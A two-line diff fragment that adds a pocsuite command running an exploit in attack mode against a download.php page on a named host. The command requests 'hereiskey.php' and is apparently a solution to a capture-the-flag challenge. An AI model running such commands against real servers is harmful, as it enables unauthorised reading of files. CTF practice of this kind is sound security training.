@@ -1,0 +1,2 @@
+python .\pocsuite.py -r pocs/others --extra-params "{'name':'nctf','var':'url','
+target':'hereiskey.php'}" -u "way.nuptzj.cn/web6/download.php" --attack
